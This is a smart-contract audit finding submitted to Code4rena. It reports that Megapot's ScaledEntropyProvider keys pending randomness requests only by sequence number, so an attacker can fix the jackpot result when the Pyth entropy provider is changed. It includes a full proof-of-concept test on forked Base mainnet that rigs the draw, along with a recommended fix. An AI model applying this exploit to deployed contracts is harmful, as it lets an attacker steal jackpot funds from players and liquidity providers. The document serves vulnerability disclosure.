# M-06 | Changes to Pyth Entropy Provider Allow Attacker to Fix Jackpot Result


**Severity:** Medium  
**Category:** Randomness  
**Type:** Insufficient State Binding (Entropy Provider + Sequence Number)  
**Protocol:** Megapot (Jackpot lottery on Base)  
**Submitted via:** Code4rena  

## Summary

The `ScaledEntropyProvider` stores pending entropy requests in a mapping keyed **only** by Pyth sequence number (`mapping(uint64 => PendingRequest) pending`). When the admin changes the active Pyth entropy provider via `setEntropyProvider`, sequence numbers from different providers can collide. An attacker can exploit this to pre-register a request with a predetermined outcome, advance the new provider's sequence number, and force the jackpot to use attacker-controlled "random" numbers.

## Description

`ScaledEntropyProvider` acts as a wrapper around Pyth Network's Entropy V2 contract. It exposes `requestAndCallbackScaledRandomness(...)` which:

1. Calls `entropy.requestV2(entropyProvider, _gasLimit)` to obtain a `sequence` number.
2. Stores the request details (callback, selector, context, and `SetRequest[]` for scaled sampling) in `pending[sequence]`.

When the entropy provider later reveals via `revealWithCallback`, the `IEntropyConsumer` callback `_entropyCallback(uint64 sequence, ...)` is triggered and `Jackpot::scaledEntropyCallback` consumes the random numbers to determine the winning ticket.

**The flaw:** The `pending` mapping is **not scoped to the entropy provider address**. Different Pyth entropy providers maintain independent sequence counters. An admin call to `setEntropyProvider(newProvider)` can cause sequence number reuse/collision across providers.

### Attack Flow (High-Level)

1. Attacker monitors mempool and sees the owner will call `setEntropyProvider(newProvider)`.
2. Attacker front-runs and calls `requestAndCallbackScaledRandomness` on the **current** provider, registering a `SetRequest[]` that always produces a fixed outcome (e.g. normals = [1,2,3,4,5], bonus = 1) by choosing ranges that guarantee the same samples regardless of the random input. They use a reverting callback so `pending[sequence]` is **not cleared**.
3. Admin's `setEntropyProvider(newProvider)` executes.
4. Attacker advances the **new** provider's sequence number (by calling `requestV2` repeatedly or waiting) until it reaches the previously reserved sequence `s`.
5. Attacker buys lottery tickets matching the predetermined winning numbers.
6. When `Jackpot::runJackpot` is called, it overwrites `pending[s]` with Jackpot's own callback/context but **keeps the attacker's original `SetRequest[]`** at the front of the array.
7. When the new provider reveals, `scaledEntropyCallback` uses only the attacker's fixed requests → attacker wins the jackpot.

The attack is economically viable on Base (L2 gas is cheap) relative to potential jackpot winnings. If the new provider starts with a lower sequence number than the old one, the attacker can simply wait for natural usage to catch up.

## Impact

- **Jackpot Outcome Manipulation**: Attacker can force any desired winning combination.
- **Direct Theft**: Attacker claims the entire jackpot (or large share) at the expense of honest players and Liquidity Providers.
- **Loss of Trust**: Any admin change of the entropy provider creates a window of exploitability, undermining confidence in the fairness of the lottery.

**Exploitability:** High when admin changes entropy provider. Medium-High in general because sequence number gaps on Base are in the hundreds of thousands but gas cost remains acceptable for high-value jackpots.

## Proof of Concept

### 1. Hardhat Config Change (hardhat.config.ts)

```ts
hardhat: {
  chainId: 31337,
  allowUnlimitedContractSize: true,
  forking: {
    url: process.env.MAINNET_RPC_URL!, // make sure to set this env variable to Base mainnet
    blockNumber: 37973769, // block number I tested with
    enabled: true,
  },
  gasPrice: 1000000000
}
```

### 2. New Interface File: contracts/interfaces/IEntropyV2Complete.sol

```solidity
//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.28;

import { IEntropyV2 } from "@pythnetwork/entropy-sdk-solidity/IEntropyV2.sol";

interface IEntropyV2Complete is IEntropyV2 {
     struct Request {
        // Storage slot 1 //
        address provider;
        uint64 sequenceNumber;
        // The number of hashes required to verify the provider revelation.
        uint32 numHashes;
        // Storage slot 2 //
        // The commitment is keccak256(userCommitment, providerCommitment). Storing the hash instead of both saves 20k gas by
        // eliminating 1 store.
        bytes32 commitment;
        // Storage slot 3 //
        // The number of the block where this request was created.
        // Note that we're using a uint64 such that we have an additional space for an address and other fields in
        // this storage slot. Although block.number returns a uint256, 64 bits should be plenty to index all of the
        // blocks ever generated.
        uint64 blockNumber;
        // The address that requested this random number.
        address requester;
        // If true, incorporate the blockhash of blockNumber into the generated random value.
        bool useBlockhash;
        // True if this is a request that expects a callback.
        bool isRequestWithCallback;
    }

    event RequestedWithCallback(
        address indexed provider,
        address indexed requestor,
        uint64 indexed sequenceNumber,
        bytes32 userRandomNumber,
        Request request
    );

    // Register msg.sender as a randomness provider. The arguments are the provider's configuration parameters
    // and initial commitment. Re-registering the same provider rotates the provider's commitment (and updates
    // the feeInWei).
    //
    // chainLength is the number of values in the hash chain *including* the commitment, that is, chainLength >= 1.
    function register(
        uint128 feeInWei,
        bytes32 commitment,
        bytes calldata commitmentMetadata,
        uint64 chainLength,
        bytes calldata uri
    ) external;

     function revealWithCallback(
        address provider,
        uint64 sequenceNumber,
        bytes32 userRandomNumber,
        bytes32 providerRevelation
    ) external;
}
```

### 3. Full Test File: C4PoC.spec.ts (Replace existing contents)

```ts
import { ethers } from "hardhat";
import DeployHelper from "@utils/deploys";

import { getWaffleExpect, getAccounts } from "@utils/test/index";
import { ether, usdc } from "@utils/common";
import { Account } from "@utils/test";

import { PRECISE_UNIT } from "@utils/constants";
import { IEntropyV2Complete } from "../../typechain-types";

import {
  GuaranteedMinimumPayoutCalculator,
  Jackpot,
  JackpotBridgeManager,
  JackpotLPManager,
  JackpotTicketNFT,
  MockDepository,
  ReentrantUSDCMock,
  ScaledEntropyProvider,
  ScaledEntropyProviderMock,
} from "@utils/contracts";
import {
  Address,
  JackpotSystemFixture,
  RelayTxData,
  Ticket,
} from "@utils/types";
import { deployJackpotSystem } from "@utils/test/jackpotFixture";
import {
  calculatePackedTicket,
  calculateTicketId,
  generateClaimTicketSignature,
  generateClaimWinningsSignature,
} from "@utils/protocolUtils";
import { ADDRESS_ZERO } from "@utils/constants";
import {
  takeSnapshot,
  SnapshotRestorer,
  time,
} from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { EventLog, keccak256, Log } from "ethers";

const expect = getWaffleExpect();

describe("C4", () => {
  let owner: Account;
  let buyerOne: Account;
  let buyerTwo: Account;
  let referrerOne: Account;
  let referrerTwo: Account;
  let referrerThree: Account;
  let solver: Account;

  let jackpotSystem: JackpotSystemFixture;
  let jackpot: Jackpot;
  let jackpotNFT: JackpotTicketNFT;
  let jackpotLPManager: JackpotLPManager;
  let payoutCalculator: GuaranteedMinimumPayoutCalculator;
  let usdcMock: ReentrantUSDCMock;
  let entropyProvider: ScaledEntropyProvider;
  let snapshot: SnapshotRestorer;
  let jackpotBridgeManager: JackpotBridgeManager;
  let mockDepository: MockDepository;
  let entropy: IEntropyV2Complete;
  let pythEntropyProvider: Account;
  let pythEntropyProvider2: Account;

  const providerContribution = ethers.encodeBytes32String("hello");
  const providerContribution2 = ethers.keccak256(providerContribution);

  beforeEach(async () => {
    [
      owner,
      buyerOne,
      buyerTwo,
      referrerOne,
      referrerTwo,
      referrerThree,
      solver,
      pythEntropyProvider,
      pythEntropyProvider2
    ] = await getAccounts();

    jackpotSystem = await deployJackpotSystem();
    jackpot = jackpotSystem.jackpot;
    jackpotNFT = jackpotSystem.jackpotNFT;
    jackpotLPManager = jackpotSystem.jackpotLPManager;
    payoutCalculator = jackpotSystem.payoutCalculator;
    usdcMock = jackpotSystem.usdcMock;

    // Give some USDC to the attacker
    await usdcMock.connect(owner.wallet).transfer(buyerOne.address, usdc(5000));
    await usdcMock
      .connect(buyerOne.wallet)
      .approve(jackpot.getAddress(), usdc(1000000));

    entropy = await ethers.getContractAt(
      "IEntropyV2Complete",
      "0x6e7d74fa7d5c90fef9f0512987605a6d546181bb" // Pyth Entropy contract from Base mainnet
    );

    entropyProvider = await jackpotSystem.deployer.deployScaledEntropyProvider(
      await entropy.getAddress(),
      pythEntropyProvider.address
    );

    // Register different entropy providers for testing
    await entropy.connect(pythEntropyProvider.wallet).register(
      64,
      ethers.keccak256(providerContribution2),
      "0x00", // commitment metadata (not used)
      1024,
      "0x00" // uri (not used)
    );
    await entropy.connect(pythEntropyProvider2.wallet).register(
      64,
      ethers.keccak256(providerContribution2),
      "0x00", // commitment metadata (not used)
      1024,
      "0x00" // uri (not used)
    );

    // Setup the scenario such that the `pythEntropyProvider` currently used by the lottery system is at sequence number 2
    // (while `pythEntropyProvider2` - which the admin will switch to use later - is behind at sequence number 1)
    const initContrib = ethers.encodeBytes32String("test");
    const initFee = await entropy["getFeeV2(address,uint32)"](pythEntropyProvider.address, 0);
    await entropy.requestV2(pythEntropyProvider.address, keccak256(initContrib), 0, {value: initFee});
    const pythEntropyProviderInfo = await entropy.getProviderInfoV2(pythEntropyProvider.address);
    expect(pythEntropyProviderInfo.sequenceNumber).to.equal(2, "Should be at sequence number 2");
    const pythEntropyProviderInfo2 = await entropy.getProviderInfoV2(pythEntropyProvider2.address);
    expect(pythEntropyProviderInfo2.sequenceNumber).to.equal(1, "Should be at sequence number 1");

    await jackpot
      .connect(owner.wallet)
      .initialize(
        usdcMock.getAddress(),
        await jackpotLPManager.getAddress(),
        await jackpotNFT.getAddress(),
        entropyProvider.getAddress(),
        await payoutCalculator.getAddress(),
      );

    await jackpot.connect(owner.wallet).initializeLPDeposits(usdc(10000000));

    await usdcMock
      .connect(owner.wallet)
      .approve(jackpot.getAddress(), usdc(1000000));
    await jackpot.connect(owner.wallet).lpDeposit(usdc(1000000));

    await jackpot
      .connect(owner.wallet)
      .initializeJackpot(
        BigInt(await time.latest()) +
          BigInt(jackpotSystem.deploymentParams.drawingDurationInSeconds),
      );

    jackpotBridgeManager =
      await jackpotSystem.deployer.deployJackpotBridgeManager(
        await jackpot.getAddress(),
        await jackpotNFT.getAddress(),
        await usdcMock.getAddress(),
        "MegapotBridgeManager",
        "1.0.0",
      );

    mockDepository = await jackpotSystem.deployer.deployMockDepository(
      await usdcMock.getAddress(),
    );

    snapshot = await takeSnapshot();
  });

  beforeEach(async () => {
    await snapshot.restore();
  });

  describe("PoC", async () => {
    it("demonstrates the C4 submission's validity", async () => {
      // Attacker calls `requestAndCallbackScaledRandomness` such that the result is garantueed:
      // The first sample set will always be [1,2,3,4,5] and the second is always [1], regardless of the random number
      const setRequests = [
        {
          samples: 5,
          minRange: 1,
          maxRange: 5,
          withReplacement: false
        },
        {
          samples: 1,
          minRange: 1,
          maxRange: 1,
          withReplacement: false
        }
      ];
      const gasLimit = 100_000;
      const fee = await entropyProvider.getFee(gasLimit);
      await entropyProvider
        .connect(buyerOne.wallet)
        .requestAndCallbackScaledRandomness
        .staticCall(
          gasLimit,
          setRequests,
          "0x12345678",
          ethers.encodeBytes32String("context"),
          { value: fee }
      );

      // Attacker requests randomness which will use identical sequence number as that of a subsequent call to `jackpot.runJackpot`
      const requestRandomTx = await entropyProvider
        .connect(buyerOne.wallet)
        .requestAndCallbackScaledRandomness(
          gasLimit,
          setRequests,
          "0x12345678",
          ethers.encodeBytes32String("context"),
          { value: fee }
      );
      // Extract userContribution from the transaction logs
      const requestRandomReceipt = await requestRandomTx.wait();
      const eventSignature = entropy.interface.getEvent("RequestedWithCallback").topicHash;
      const event = requestRandomReceipt!.logs
        .filter((log): log is Log => log instanceof ethers.Log).find(
          (log) => log.topics[0] === eventSignature
        );
      const userContribution = entropy.interface.parseLog(event!)?.args[3];
      await entropyProvider
        .connect(owner.wallet)
        .setEntropyProvider(pythEntropyProvider2.address);

      // Attacker advances the sequence number of `pythEntropyProvider2`, so that after the system switches to use this provider,
      // the sequence number will match
      const initFee = await entropy["getFeeV2(address,uint32)"](pythEntropyProvider2.address, 0);
      await entropy
        .connect(buyerOne.wallet)
        .requestV2(pythEntropyProvider2.address, keccak256(ethers.encodeBytes32String("test")), 0, {value: initFee});

      // Attacker buys several of the winning ticket
      await jackpot.connect(buyerOne.wallet).buyTickets(
        Array(10).fill({normals: [1, 2, 3, 4, 5], bonusball: 1}),
        buyerOne.address,
        [],
        [],
        ethers.encodeBytes32String("source")
      );
      const userTicketIds = (await jackpotNFT.getUserTickets(buyerOne.address, 1)).map(t => t.ticketId);

      await time.increase(jackpotSystem.deploymentParams.drawingDurationInSeconds + BigInt(1));

      const entropyFee: bigint = ether(0.00005);
      const entropyBaseGasLimit: bigint = BigInt(1000000);
      const entropyVariableGasLimit: bigint = BigInt(250000);
      const drawingState = await jackpot.getDrawingState(1);
      await jackpot
        .connect(buyerOne.wallet)
        .runJackpot({value: entropyFee + ((entropyBaseGasLimit + entropyVariableGasLimit * drawingState.bonusballMax) * BigInt(1e7))});

      // Entropy provider gives the random number
      await entropy.connect(pythEntropyProvider.wallet).revealWithCallback(
        pythEntropyProvider.address,
        2,
        userContribution,
        providerContribution
      );

      const userInitUSDCBal = await usdcMock.balanceOf(buyerOne.address);
      await jackpot.connect(buyerOne.wallet).claimWinnings(userTicketIds);
      const finalUSDCBal = await usdcMock.balanceOf(buyerOne.address);
      console.log("Balance change: ", finalUSDCBal - userInitUSDCBal);
    }).timeout(60 * 15 * 1000);
  });
});
```

> **Note:** Running this test on a forked Base mainnet at the specified block shows the attacker making approximately **166,000 USDC** profit in a single jackpot.

## Recommendation

**Primary Fix** — Scope pending requests by both provider address **and** sequence number:

```diff
-    mapping(uint64 => PendingRequest) private pending;
+    mapping(address => mapping(uint64 => PendingRequest)) private pending;
```

Update all access sites:
- `_storePendingRequest`
- `_entropyCallback` (and the dispatch logic)
- Any cleanup logic

**Additional Mitigations**

1. When `setEntropyProvider` is called, either:
   - Revert if there are still pending requests for the old provider, or
   - Clear/migrate pending requests (with care), or
   - Emit a strong event and pause drawings until pending requests are resolved.

2. Consider adding an `entropyProvider` field inside `PendingRequest` and validating it on callback.

3. Document clearly that changing the entropy provider is a sensitive administrative action that should be done with extreme caution (e.g. only when no drawings are active and no pending requests exist).

---

**Status:** Open (as of submission)  
**Tags:** `#randomness` `#entropy` `#pyth` `#jackpot` `#medium-severity` `#provider-switch` `#state-collision`
